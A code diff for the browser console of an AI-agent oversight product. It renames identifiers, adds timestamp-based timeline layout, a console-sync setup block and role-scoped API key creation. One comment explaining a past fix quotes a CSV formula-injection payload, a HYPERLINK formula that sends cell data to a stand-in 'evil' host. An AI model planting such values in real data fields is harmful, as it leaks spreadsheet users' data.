@@ -51,7 +51,7 @@
   // replaces the shared cookie; the server then 409s this tab's stale
   // mutations instead of retargeting them.
   try {
-    Object.defineProperty(window, "__avActiveOrgId", {
+    Object.defineProperty(window, "__pvActiveOrgId", {
       get: function () {
         return state.session && state.session.org ? state.session.org.id : undefined;
       },
@@ -2302,7 +2302,7 @@
     // one char short — missing \r. R77 F1's threat description
     // names CR explicitly: "Excel / Google Sheets / Numbers
     // interpret any cell whose first char is =, +, -, @, TAB
-    // or CR as a formula." A leaked-PV_INGEST_TOKEN attacker
+    // or CR as a formula." A leaked-PV_CONSOLE_TOKEN attacker
     // (R119 F2 / R124 F3 / R125 F3 threat model) that sets
     // sessionExternalId = "\r=HYPERLINK(\"http://evil/\"&A2,\"Sign here\")"
     // lands a CR-leading formula into an owner's Excel-opened
@@ -2540,11 +2540,24 @@
     // when each event actually happened relative to the session's timeline,
     // and derive a parent-child depth so LLM → tool-call chains indent.
     var totalDur = events.reduce(function (a, e) { return a + (e.durationMs || 0); }, 0) || 1;
+    // Live events carry a timestamp but no measured duration (the
+    // ingest payload has none). Place those bars by when the event
+    // happened relative to the first and last event instead of
+    // pretending every bar is a one-percent-wide duration.
+    var haveDurations = events.some(function (e) { return e.durationMs > 0; });
+    var firstTs = events.length ? new Date(events[0].ts).getTime() : NaN;
+    var lastTs = events.length ? new Date(events[events.length - 1].ts).getTime() : NaN;
+    var tsSpan = isFinite(firstTs) && isFinite(lastTs) && lastTs > firstTs ? lastTs - firstTs : 0;
     var offset = 0;
     var parentLlm = -1;
     var eventsWithLayout = events.map(function (e, i) {
       var startPct = (offset / totalDur) * 100;
       var widthPct = Math.max(1, ((e.durationMs || 0) / totalDur) * 100);
+      if (!haveDurations && tsSpan > 0) {
+        var at = new Date(e.ts).getTime();
+        startPct = isFinite(at) ? Math.min(99, ((at - firstTs) / tsSpan) * 100) : 0;
+        widthPct = 1;
+      }
       var depth = 0;
       if (e.kind === "llm") { parentLlm = i; depth = 0; }
       else if (e.kind === "tool" || e.kind === "guard" || e.kind === "block") {
@@ -3038,6 +3051,16 @@
         sub: ev.sub === REDACT_D ? "[hidden for member role]" : ev.sub,
         policy: ev.policyId,
       }, null, 2)) + "</pre>";
+    } else if (ev.msg === REDACT_D) {
+      payload = '<div class="empty-mini">Payload hidden for the member role.</div>';
+    } else if (ev.msg) {
+      // Live events: the body is what the daemon journaled for this
+      // step (the uploader serialises the ATIF step as JSON). Show it
+      // pretty-printed when it parses, verbatim otherwise — never a
+      // synthesised prompt/response.
+      var shown = ev.msg;
+      try { shown = JSON.stringify(JSON.parse(ev.msg), null, 2); } catch (e) { /* plain text body */ }
+      payload = '<pre class="payload">' + esc(shown) + (ev.sub && ev.sub !== REDACT_D ? "\n\n" + esc(ev.sub) : "") + "</pre>";
     } else {
       payload = '<div class="empty-mini">No payload attached.</div>';
     }
@@ -3100,11 +3123,11 @@
   async function applyReceiptVerification(r) {
     var head = document.querySelector('.receipt-head[data-verify-state="pending"]');
     if (!head) return;
-    if (!window.avVerifyReceipt) return;
+    if (!window.pvVerifyReceipt) return;
     // R117 F1: server redacts receipt.body + sigB64 to
     // '[redacted-member-view]' for member-role callers so the
     // signed JSON's cost.cost_usd_micros doesn't leak. Skip the
-    // verifier here — otherwise avVerifyReceipt returns
+    // verifier here — otherwise pvVerifyReceipt returns
     // {supported:true, ok:false} on the sentinel and the head
     // flips to "Signature INVALID", which is UX-misleading (the
     // signature isn't invalid, it's simply not visible to
@@ -3121,7 +3144,7 @@
       if (subR) subR.textContent = "Ask an admin for signed-receipt access.";
       return;
     }
-    var res = await window.avVerifyReceipt(r.publicKeyHex, r.rawSignatureB64, r.rawBody);
+    var res = await window.pvVerifyReceipt(r.publicKeyHex, r.rawSignatureB64, r.rawBody);
     var check = head.querySelector('.check');
     var title = head.querySelector('.title');
     var sub = head.querySelector('div > div:last-child');
@@ -3220,7 +3243,7 @@
               onConfirm: function () {
                 state.ds.rotateDeploymentToken(id).then(function (r) {
                   showTokenModal(r.ingestToken, "Token rotated", {
-                    subtitle: "Store this token in your secret manager — it's shown only once. It links your daemon to this console (the PV_INGEST_TOKEN control-plane hookup ships with the beta; tokens minted now stay valid).",
+                    subtitle: "Store this token in your secret manager — it's shown only once. Set it as PV_CONSOLE_TOKEN (with PV_CONSOLE_URL and PV_CONSOLE_DEPLOYMENT from the deployment page) and run `pvctl console-sync --watch` on the host that runs your agent.",
                     notice: "The previous ingest token is invalidated immediately; every daemon using it will fail to connect until you swap the value.",
                   });
                 })
@@ -3239,6 +3262,16 @@
       });
     }
     restoreScrollFor(location.hash);
+  }
+
+  // Origin `pvctl console-sync` should post to. In live mode this is the
+  // API the console itself talks to (window.API_BASE, or the page origin
+  // when the API is served alongside the SPA); the demo shows the hosted
+  // API. console-sync appends /api/v1/ingest itself.
+  function consoleApiOrigin() {
+    if (window.MOCK_MODE) return "https://api.proofvisor.com";
+    var base = (window.API_BASE || "").replace(/\/+$/, "");
+    return base || location.origin;
   }
 
   function deploymentEmptyHero() {
@@ -3263,6 +3296,10 @@
     var statusPill = d.status === "connected"
       ? '<span class="pill ok status-dot">connected</span>'
       : '<span class="pill neutral status-dot">' + esc(d.status) + "</span>";
+    var consoleSyncEnv =
+      "PV_CONSOLE_URL=" + consoleApiOrigin() + "\n" +
+      "PV_CONSOLE_DEPLOYMENT=" + d.id + "\n" +
+      "PV_CONSOLE_TOKEN=<token shown once at create or rotate>";
 
     main.innerHTML =
       pageHeader(d.name, d.environment, '<a href="' + esc(backToListUrl("deployments")) + '" class="btn">← All deployments</a>') +
@@ -3289,22 +3326,19 @@
         "</div>" +
       "</div>" +
       // "Now what?" — the first question after creating a deployment.
-      // A copyable env block that points a daemon at this workspace.
-      // Honesty rule (R275, same class as the token modals): the
-      // hosted ingest hookup ships with the beta — the daemon reads
-      // these PV_INGEST_* vars then; ingest.proofvisor.com has no DNS
-      // yet, and "connected within a few seconds" was a promise no
-      // real deployment could keep today.
+      // A copyable env block for `pvctl console-sync`, the uploader that
+      // ships with the CLI: it reads PV_CONSOLE_URL, PV_CONSOLE_DEPLOYMENT
+      // and PV_CONSOLE_TOKEN (crates/pv-cli/src/console_sync.rs), appends
+      // /api/v1/ingest to the URL itself, and posts the daemon's spooled
+      // sessions, events and receipts here. The displayed text and the
+      // clipboard payload are the same string so what you read is what
+      // you paste; the token placeholder is never a redacted hint.
       '<div class="card" style="margin-bottom:12px">' +
         "<h2>Connect your daemon</h2>" +
-        '<p style="color:var(--fg-2); font-size:var(--t-sec); margin:0 0 10px">Store these with your secrets now — the daemon picks them up when the hosted control-plane link lands with the beta, and this page flips to <b>connected</b>. Tokens you mint today stay valid.</p>' +
-        '<pre class="policy-body" style="margin:0 0 10px; user-select:all">' +
-          "PV_INGEST_URL=https://ingest.proofvisor.com/v1   # live with the beta\n" +
-          "PV_DEPLOYMENT=" + esc(d.id) + "\n" +
-          "PV_INGEST_TOKEN=" + esc(d.ingestTokenHint || "pv_live_…") + "  # full token shown once at create/rotate" +
-        "</pre>" +
-        '<button type="button" class="btn" data-copy="PV_INGEST_URL=https://ingest.proofvisor.com/v1\nAV_DEPLOYMENT=' + esc(d.id) + '\nAV_INGEST_TOKEN=<your-token>">⧉ Copy env block</button>' +
-        '<span style="margin-left:10px; color:var(--fg-3); font-size:11.5px">Lost the token? Rotate below — the old one stops working immediately.</span>' +
+        '<p style="color:var(--fg-2); font-size:var(--t-sec); margin:0 0 10px">On the host that runs <code>proofvisord</code>, export these and start the uploader with <code>pvctl console-sync --watch</code>. It posts the daemon\'s spooled sessions, events and signed receipts to this console; this page flips to <b>connected</b> after the first upload.</p>' +
+        '<pre class="policy-body" style="margin:0 0 10px; user-select:all">' + esc(consoleSyncEnv) + "</pre>" +
+        '<button type="button" class="btn" data-copy="' + esc(consoleSyncEnv) + '">⧉ Copy env block</button>' +
+        '<span style="margin-left:10px; color:var(--fg-3); font-size:11.5px">The token is shown once, at create or rotate. Lost it? Rotate below — the old one stops working immediately.</span>' +
       "</div>" +
       '<div class="card" style="padding:0">' +
         '<div style="padding:12px 16px; border-bottom: 1px solid var(--border); display:flex; align-items:baseline; gap:8px;">' +
@@ -3324,7 +3358,7 @@
         onConfirm: function () {
           state.ds.rotateDeploymentToken(d.id).then(function (r) {
             showTokenModal(r.ingestToken, "Token rotated", {
-              subtitle: "Store this token in your secret manager — it's shown only once. It links your daemon to this console (the PV_INGEST_TOKEN control-plane hookup ships with the beta; tokens minted now stay valid).",
+              subtitle: "Store this token in your secret manager — it's shown only once. Set it as PV_CONSOLE_TOKEN (with PV_CONSOLE_URL and PV_CONSOLE_DEPLOYMENT from the deployment page) and run `pvctl console-sync --watch` on the host that runs your agent.",
               notice: "The previous ingest token is invalidated immediately; every daemon using it will fail to connect until you swap the value.",
             });
           })
@@ -3502,7 +3536,7 @@
         .then(function (r) {
           close();
           showTokenModal(r.ingestToken, "Deployment created", {
-            subtitle: "Store this token in your secret manager — it's shown only once. It links your daemon to this console (the PV_INGEST_TOKEN control-plane hookup ships with the beta; tokens minted now stay valid).",
+            subtitle: "Store this token in your secret manager — it's shown only once. Set it as PV_CONSOLE_TOKEN (with PV_CONSOLE_URL and PV_CONSOLE_DEPLOYMENT from the deployment page) and run `pvctl console-sync --watch` on the host that runs your agent.",
             notice: "If you lose the token, rotate to mint a new one from the deployment's detail page; the current value stops being accepted immediately.",
           });
         })
@@ -3815,7 +3849,13 @@
     // to the evidence.
     try {
       var resp = await state.ds.listSessions({ limit: 100 });
-      fired = (resp.sessions || []).filter(function (s) { return (s.policiesFired || []).indexOf(id) >= 0; });
+      // Mock sessions carry policy ids; live sessions carry the policy
+      // names the daemon attributed to their events (Event.policyName),
+      // which is what the server matches against Policy.name.
+      fired = (resp.sessions || []).filter(function (s) {
+        var list = s.policiesFired || [];
+        return list.indexOf(id) >= 0 || (p.name && list.indexOf(p.name) >= 0);
+      });
     } catch (e) { /* the policy page still renders without the list */ }
     // Keep the headline consistent with the evidence below it: when we
     // have the fired-session list, derive the block count from it
@@ -4743,7 +4783,7 @@
           (m.mfaEnrolled ? ' <span class="pill neutral" title="This account requires a passkey on every sign-in">2FA</span>' : '') +
           '</div><div class="id">' + esc(m.email) + '</div></div></div></td>' +
         '<td>' + selector + '</td>' +
-        '<td style="color:var(--fg-2)">' + timeAgoCell(m.lastActive) + '</td>' +
+        '<td style="color:var(--fg-2)">' + timeAgoCell(m.joinedAt) + '</td>' +
         '<td style="white-space:nowrap">' +
           (canManage && !isSelf && m.mfaEnrolled ? '<button class="btn" data-act="reset-mfa" title="Remove all their passkeys so they can sign in with password alone — for lost or destroyed authenticators">Reset MFA</button> ' : '') +
           (canManage ? '<button class="btn danger" data-act="remove">Remove</button>' : '') +
@@ -4762,7 +4802,7 @@
             : '<span style="margin-left:auto; color:var(--fg-3); font-size:var(--t-sec)">Ask an owner or admin to manage members</span>') +
         "</div>" +
         '<div class="table-wrap"><table>' +
-          '<thead><tr><th>Person</th><th>Role</th><th>Last active</th><th class="act-3"><span class="sr-only">Actions</span></th></tr></thead>' +
+          '<thead><tr><th>Person</th><th>Role</th><th>Joined</th><th class="act-3"><span class="sr-only">Actions</span></th></tr></thead>' +
           '<tbody>' + memberRows + '</tbody>' +
         '</table></div>' +
       '</div>';
@@ -5010,6 +5050,61 @@
     });
     setTimeout(function () { backdrop.querySelector("#inv_email").focus(); }, 20);
   }
+  // Create-key dialog: a name plus the role the key acts with. The
+  // server (routes/api-keys.ts) accepts owner|admin|member, defaults to
+  // admin, and refuses a role above the caller's own, so only roles at
+  // or below the caller's rank are offered. #inpVal keeps the same id
+  // as openInputModal so the browser drills keep working.
+  function openCreateKeyModal(onConfirm) {
+    if (document.body.classList.contains("locked")) return;
+    var myRole = (state.session && state.session.org && state.session.org.role) || "admin";
+    var roles = myRole === "owner" ? ["owner", "admin", "member"] : ["admin", "member"];
+    var backdrop = h(
+      '<div class="modal-backdrop" role="dialog" aria-modal="true"><div class="modal">' +
+        "<h2>Create an API key</h2>" +
+        '<p class="sub">Keys authenticate scripts and CI as this workspace. Pick the least role the job needs: a member key can read sessions and receipts; admin can also manage deployments, policies and webhooks; owner can do everything, including deleting the workspace.</p>' +
+        '<form id="inpForm">' +
+          '<div class="field"><label for="inpVal">Key name</label>' +
+          '<input id="inpVal" type="text" required placeholder="e.g. CI runner" autocomplete="off" /></div>' +
+          '<div class="field"><label for="keyRole">Role</label>' +
+          '<select id="keyRole">' +
+            roles.map(function (r) { return '<option value="' + r + '"' + (r === "admin" ? " selected" : "") + ">" + r + "</option>"; }).join("") +
+          "</select></div>" +
+          '<div class="actions">' +
+            '<button type="button" class="btn" data-close>Cancel</button>' +
+            '<button class="btn accent" type="submit">Create</button>' +
+          "</div>" +
+        "</form>" +
+      "</div></div>"
+    );
+    document.body.appendChild(backdrop);
+    document.body.classList.add("locked");
+    var previouslyFocused = document.activeElement;
+    var uninstall;
+    var handled = false;
+    function close() {
+      if (handled) return;
+      handled = true;
+      backdrop.remove(); document.body.classList.remove("locked");
+      if (uninstall) uninstall();
+      if (previouslyFocused && previouslyFocused.focus) try { previouslyFocused.focus(); } catch (e) {}
+    }
+    uninstall = installModalKeys(backdrop, close);
+    backdrop.addEventListener("click", function (e) {
+      if (handled) return;
+      if (e.target === backdrop || e.target.hasAttribute("data-close")) close();
+    });
+    backdrop.querySelector("#inpForm").addEventListener("submit", function (e) {
+      e.preventDefault();
+      if (handled) return;
+      var name = backdrop.querySelector("#inpVal").value.trim();
+      var role = backdrop.querySelector("#keyRole").value;
+      if (!name) return;
+      close();
+      onConfirm(name, role);
+    });
+    setTimeout(function () { var el = backdrop.querySelector("#inpVal"); if (el) el.focus(); }, 20);
+  }
   async function renderSettingsKeys(root) {
     root.innerHTML = '<div class="card">' + loadingBlock("table") + "</div>";
     var keys = [];
@@ -5018,24 +5113,19 @@
     function attachCreate(btn) {
       if (!btn) return;
       btn.addEventListener("click", function () {
-        openInputModal({
-          title: "Create an API key",
-          label: "Key name",
-          placeholder: "e.g. CI runner",
-          confirmLabel: "Create",
-          onConfirm: async function (name) {
-            if (!name || !name.trim()) return;
-            try {
-              var res = await state.ds.createApiKey(name.trim());
-              showTokenModal(res.plaintextToken, "API key created", {
-                subtitle: "Store this API key in your CI runner or automation's secret manager. Send it as the Bearer token in the Authorization header.",
-                notice: "If you lose it, delete this key and create a new one — the plaintext value is never stored on the server, only its argon2 hash.",
-              });
-              await renderSettingsKeys(root);
-            } catch (e) {
-              toast(e && e.message ? e.message : "Could not create key");
-            }
-          },
+        openCreateKeyModal(async function (name, role) {
+          try {
+            var res = await state.ds.createApiKey(name, role);
+            showTokenModal(res.plaintextToken, "API key created", {
+              subtitle: "Store this API key in your CI runner or automation's secret manager. Send it as the Bearer token in the Authorization header. It acts with the " + role + " role.",
+              notice: "If you lose it, delete this key and create a new one — the plaintext value is never stored on the server, only its argon2 hash.",
+            });
+            await renderSettingsKeys(root);
+          } catch (e) {
+            var msg = e && e.message ? e.message : "Could not create key";
+            if (e && e.errorCode === "cannot_grant_role_above_own") msg = "You can't create a key with a role above your own.";
+            toast(msg, true);
+          }
         });
       });
     }
@@ -5056,6 +5146,7 @@
       return '<tr data-id="' + esc(k.id) + '">' +
         '<td><div style="font-weight:500">' + esc(k.name) + '</div><div class="id">' + esc(k.id) + "</div></td>" +
         '<td class="mono">' + esc(k.hint) + "</td>" +
+        '<td><span class="pill neutral">' + esc(k.role || "admin") + "</span></td>" +
         '<td style="color:var(--fg-2)">' + timeAgoCell(k.lastUsedAt) + "</td>" +
         '<td style="color:var(--fg-2)">' + timeAgoCell(k.createdAt) + "</td>" +
         '<td>' +
@@ -5071,7 +5162,7 @@
           '<button class="btn accent" id="createKeyBtn" style="margin-left:auto">+ Create key</button>' +
         "</div>" +
         '<div class="table-wrap"><table>' +
-          "<thead><tr><th>Name</th><th>Prefix</th><th>Last used</th><th>Created</th><th class=\"act-2\"><span class=\"sr-only\">Actions</span></th></tr></thead>" +
+          "<thead><tr><th>Name</th><th>Prefix</th><th>Role</th><th>Last used</th><th>Created</th><th class=\"act-2\"><span class=\"sr-only\">Actions</span></th></tr></thead>" +
           "<tbody>" + rows + "</tbody>" +
         "</table></div>" +
       "</div>";
@@ -5711,16 +5802,15 @@
 
     function openAddModal() {
       if (document.body.classList.contains("locked")) return;
-      // R230 F1: server-side dispatchEvent() only fires 3 event
-      // names — policy.block (ingest.ts), member.invited (members.ts),
-      // and the endpoint-scoped smoketest 'test' (webhooks.ts). Prior
-      // shape offered apikey.created, apikey.revoked, and
-      // webhook.test_fired too — those are audit-only slugs
-      // (writeAudit event field) that never round-trip through the
-      // webhook fanout. A user subscribing to any of them silently
-      // received zero deliveries forever. Trim to what the server
-      // actually emits + the '*' wildcard.
-      var events = ["policy.block", "member.invited", "*"];
+      // Only event names the server's dispatchEvent() actually emits:
+      // policy.block and session.blocked (ingest.ts), member.invited
+      // (members.ts), apikey.created (api-keys.ts), plus the '*'
+      // wildcard. The endpoint-scoped smoke test 'test' is sent by the
+      // "Send test" button regardless of subscription. Audit-only slugs
+      // (apikey.revoked, webhook.test_fired, …) never round-trip through
+      // the fanout, so offering them here would subscribe people to
+      // silence (R230 F1).
+      var events = ["policy.block", "session.blocked", "member.invited", "apikey.created", "*"];
       var backdrop = h(
         '<div class="modal-backdrop" role="dialog" aria-modal="true">' +
           '<div class="modal">' +
@@ -6345,7 +6435,7 @@
       // launcher pill already hides in fresh mode; the palette follows
       // the same rule.
       var freshNow = freshT0() != null;
-      if (window.AVTour && !freshNow) actions.unshift({ g: "Actions", label: "See the full flow", desc: "Guided tour of the money story", run: function () { window.AVTour.start(); } });
+      if (window.PVTour && !freshNow) actions.unshift({ g: "Actions", label: "See the full flow", desc: "Guided tour of the money story", run: function () { window.PVTour.start(); } });
       if (typeof state.ds.simulateAttack === "function" && attackReady()) actions.push({ g: "Actions", label: "Simulate an agent attack", desc: "Stage a live blocked payment", run: function () { navigate("#/overview"); setTimeout(runAttackDemo, 250); } });
     }
     actions.push({ g: "Actions", label: "New policy", desc: "Create a spend cap, vendor allowlist, or PII guard", run: function () { navigate("#/policies"); setTimeout(openCreatePolicyModal, 250); } });
@@ -6741,6 +6831,6 @@
     // crash card stands down (post-boot errors are logged, not fatal)
     // and the blank-page watchdog is satisfied. Set only AFTER boot so
     // an exception mid-boot still shows the card.
-    window.__avBooted = true;
+    window.__pvBooted = true;
   });
 })();
